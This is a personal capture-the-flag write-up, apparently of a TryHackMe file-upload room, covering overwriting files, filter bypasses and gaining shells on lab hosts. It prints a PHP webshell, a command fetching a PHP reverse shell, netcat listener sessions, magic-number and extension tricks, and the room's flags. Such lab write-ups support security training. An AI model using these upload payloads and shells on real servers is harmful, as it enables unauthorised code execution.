File uploading is an integral part of any web application and uploading can open up severe vulnerabilities in the server when handed badly. 
- from minor nuisance to RCE(remote code execution) if attacker uploads a shell
- injecting malicious content, pages, and altering data

to exploit-
- client side filtering - look at the code and bypass the filter
- server side filtering - guess the possible functionality of the filter, upload a file and then analyse the error messages

## Overwriting Existing Files
protecting files form being overwritten -
- make sure it's a new name
- file permissions

To do the task given, navigate to the website given
- view the source code and the name of the image 
- the name of the image is mountains.jpg, now download any other image and save it as mountains.jpg.
- Now, click on select file and select mountains.jpg, then click on upload
- The flag gets displayed
**FLAG - `THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}`**

## Remote Code Execution
two basic ways to achieve RCE-
1. webshells
2. Reverse/bind shells

##### Achieving RCE using webshells
first run a gobuster scan on the website
```bash
$ gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

on running the scan we see that we have 2 directories resources and assets
whatever we upload can be seen in the /resources directory

write a script and save it in a .php file
however for this challenge webshell doesn't work
```php
<?php
	echo system($_GET["cmd']);
?> 
```
and then upload this file and go to /resources and click on it, you see the response in the url 

##### Achieving RCE using reverse shell
download the file mentioned using
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
Just rename it to shell.php for convenience
then select and upload shell.php

then open a netcat listener in terminal using 
```bash
nc -lvnp 1234
```

then go to /resources/shell.php
nothing loads on the site however open the terminal with nc listener, a reverse shell is seen now just do whoami and then navigate to /var/www and cat flag.txt to get the flag

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.97.222] from (UNKNOWN) [10.10.25.54] 41296
Linux f300b6aced54 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:39:07 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /var/www
$ ls
flag.txt
html
$ cat flag.txt
THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}
$ 
```

**FLAG - `THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}`**

## Filtering
Client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.
server side filtering -As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.
###### types of filtering
1. extension validation  - filters that check extensions blacklist or whitelist extensions
2. file type filtering - to verify contents of the file
	- MIME((Multipurpose Internet Mail Extension) validation - MIME type is specified in the header of the request
		eg: Content-Type: image/jpeg
	- Magic number validation - The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. basically file signatures.
3. File length filtering - prevents huge files from being uploaded
4. File name filtering - no repetition of names, no special characters/ control characters
5. File content filtering - scan contents of file

### Bypassing client side filtering
There are four easy ways to bypass your average client-side file upload filter:

1. _Turn off Javascript in your browser_ -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
2. _Intercept and modify the incoming page._ Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.
3. _Intercept and modify the file upload_. Where the previous method works _before_ the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
4. _Send the file directly to the upload point._ Why use the webpage with the filter, when you can send the file directly using a tool like `curl`? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like  `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

So this site doesn't let us upload anything other than images
so we go to burp, turn on intercept
and then 
```http
GET / HTTP/1.1
Host: java.uploadvulns.thm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

```
we right click on this and then select do intercept and response to this request and send it forward
then we get
```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 03 Dec 2023 06:22:26 GMT
Content-Type: text/html; cherset=utf-8;charset=UTF-8
Content-Length: 1221
Connection: close
Vary: Accept-Encoding
Front-End-Https: on


<!DOCTYPE html>
<html>
	<head>
		<title>Java!</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
		<link rel="stylesheet" type="text/css" href="assets/css/style.css">
		<link rel="stylesheet" type="text/css" href="assets/css/icons.css">
		<link rel="stylesheet" type="text/css" href="assets/css/indieflower.css">
		<script src="assets/js/jquery-3.5.1.min.js"></script>
		<script src="assets/js/script.js"></script>
		<script src="assets/js/firstload.js"></script>
	
		<script src="assets/js/client-side-filter.js"></script>
		#delete the lineeeeee
	</head>
	<body>
		<main>
			<div id="maintext">
				<h1>Café<span id=mug> S </span>Java!</h1>
				<button class="Btn" id="uploadBtn">Select File</button>
				<form method="post" enctype="multipart/form-data">
					<input type="file" name="fileToUpload" id="fileSelect" style="display:none">
					<input class="Btn" type="submit" value="Upload" name="submit" id="submitBtn">
				</form>
				<p style="display:none;" id="errorMsg">Invalid File Type</p>
				<p style="display:none;" id="uploadtext"></p>
				<p class="responseMsg" style="display:none;" ></p>
			</div>
		</main>
	</body>
</html>
```

we delete this line as that is clearly the filter
```html
<script src="assets/js/client-side-filter.js"></script>
```
then we click forward
then go to chromium browser, select file and upload, then forward until it shows success 
then go to /images (run gobuster to get this)
then click on shell.php and open nc listener
then click on forward and go to the terminal with nc listener and same as before
```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.97.222] from (UNKNOWN) [10.10.25.54] 37840
Linux a73553061b26 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:28:28 up  1:43,  0 users,  load average: 0.20, 0.31, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /var/www/flag.txt
THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}
$ 
```
**FLAG - `THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}`**

The second type did not work for me
however here are the steps-
- rename the file to shell.jpg
- turn on intercept and catch the upload request
- change MIME type from images/jpeg to text/x-php and extension form .jpg to .php
- then do same as before

## Bypassing Server-Side Filtering: File Extensions
In the source code .php and .phtml are being blocked
so we use alternate extensions to go about this
`.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.php-s`, `.pht` and `.phar`
however the first few don't work and .phar works so let us rename it to shell.phar
before that run gobuster
```bash
$ gobuster dir -u http://annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
Use "help" for a list of commands
$ select
$ upload
```

or we can also do .jpg.png and do the reverse shell etc like the previous challenge

for this particular challenge after trial and error .php5 is the extension
then upload, go to /privacy
then start netcat listener then /privacy/filename
and the listener has a reverse shell
```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.97.222] from (UNKNOWN) [10.10.71.56] 33914
Linux a2b9a5609bd8 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:46:39 up 5 min,  0 users,  load average: 0.19, 1.46, 0.89
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /var/www/flag.txt
THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}
```
**FLAG - `THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}`**

## Bypassing Server-Side Filtering: Magic Numbers
basically we will be appending 4 AAAAs to the beginning of the php file and open them in a hex editor and change it such that the first 4 AAAAs change to the file signature of the accepted file type and deceive the website

let's run gobuster on it
```bash
$ gobuster dir -u http://magic.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://magic.uploadvulns.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/graphics             (Status: 301) [Size: 333] [--> http://magic.uploadvulns.thm/graphics/]
/assets               (Status: 301) [Size: 331] [--> http://magic.uploadvulns.thm/assets/]
```

we go to the site and try to upload the php file, it says only gifs accepted
we then append 5 AAAAs to the beginning of the php file
and move everything to the next line
like
```php
AAAA
#original content
```
then we open it in a hex editor and change the 41 41 41 41 to 47 49 46 38
now the file signature is of a gifs
on uploading it it says successful
now we do not have access to /graphics
so we just open netcat listener and directly go to graphics/shell.php
and get the flag in the terminal
```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.97.222] from (UNKNOWN) [10.10.205.168] 56740
Linux 94d79a333b8d 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:21:32 up 2 min,  0 users,  load average: 1.92, 1.63, 0.68
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /var/www/flag.txt
THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}
```

**FLAG - `THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}`**

## Challenge
- The first step is to run gobuster and find the endpoints
```bash
$ gobuster dir -u http://jewel.uploadvulns.thm dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 181] [--> /content/]
/modules              (Status: 301) [Size: 181] [--> /modules/]
/admin                (Status: 200) [Size: 1238]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/Content              (Status: 301) [Size: 181] [--> /Content/]
/Assets               (Status: 301) [Size: 179] [--> /Assets/]
/Modules              (Status: 301) [Size: 181] [--> /Modules/]
/Admin                (Status: 200) [Size: 1238]
```

- We view the page source and see upload.js, on double clicking, we see that this is responsible for client-side filtering
```js
	//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
	//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
	//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}
```

- by seeing `Wappalyzer` , we see that the admin page is using nodejs and express and hence the  php reverse shell script will not work and we need a Node.js reverse shell script

- run gobuster on /content for jpg files using the wordlist given in task files
```bash
$ gobuster dir -u http://jewel.uploadvulns.thm/content/ -w UploadVulnsWordlist.txt -x jpg                                 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/content/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                UploadVulnsWordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/ABH.jpg              (Status: 200) [Size: 705442]
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]
Progress: 35152 / 35154 (99.99%)
===============================================================
Finished
===============================================================
```

- so now, go to burp, turn on intercept, do intercept on upload.js delete the client side filtering functions
and upload your file after renaming it to KLM.jpg(any 3 letters not repeated.jpg)
- open netcat listener in terminal 
```bash
nc -lvnp 1234
```
- now go to /admin and execute ../content/KLM.jpg and click the arrow button
- A reverse shell opens in the listener, do cat /var/www/flag.txt to get flag
**FLAG - `THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}`**

remember to edit host file in / etc before and after
